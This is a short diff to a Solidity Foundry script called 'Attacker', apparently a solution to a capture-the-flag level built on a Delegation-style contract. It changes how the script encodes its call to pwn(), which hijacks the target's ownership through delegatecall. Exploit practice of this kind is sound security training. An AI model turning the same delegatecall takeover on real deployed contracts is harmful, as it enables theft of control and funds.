@@ -10,7 +10,7 @@ contract Attacker is Script {
     function run() external {
         vm.startBroadcast();
 
-        (bool success,) = address(level06).call(abi.encodeWithSignature("pwn()"));
+        (bool success,) = address(level06).call(abi.encodeCall(Delegate.pwn, ()));
         require(success, "delegate call failed");
 
         vm.stopBroadcast();
